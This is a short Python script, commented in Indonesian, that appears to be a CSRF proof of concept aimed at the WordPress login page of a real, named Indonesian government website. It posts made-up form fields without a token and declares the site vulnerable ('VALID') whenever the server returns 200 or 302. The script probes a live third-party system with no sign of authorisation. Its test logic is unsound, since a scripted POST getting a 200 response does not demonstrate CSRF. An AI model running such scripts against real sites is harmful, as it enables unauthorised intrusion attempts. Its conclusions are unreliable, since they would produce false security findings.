import requests

# URL target yang tidak ada token CSRF-nya
url = "https://balmonjogja.komdigi.go.id/wp-login.php"

# Data simulasi yang ingin dikirim (sesuaikan dengan name field di form)
payload = {
    'nama': 'Tester PoC CSRF',
    'email': 'test@poc-audit.com',
    'pesan': 'Otomatisasi pengiriman tanpa token CSRF'
}

# Header simulasi (tanpa menyertakan token apa pun)
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
}

print(f"[*] Mencoba mengirimkan POST request ke {url}...")

try:
    # Mengirim request
    response = requests.post(url, data=payload, headers=headers)
    
    # Validasi Hasil
    print(f"[+] Status Code: {response.status_code}")
    if response.status_code == 200 or response.status_code == 302:
        print("[!!!] VALID: Server menerima request tanpa pengecekan token CSRF.")
        print("-" * 30)
        print("Response Snippet:")
        print(response.text[:500]) # Cetak 500 karakter pertama respons
    else:
        print(f"[-] GAGAL: Server merespons dengan status {response.status_code}. Mungkin ada proteksi lain.")

except Exception as e:
    print(f"[!] Error: {e}")
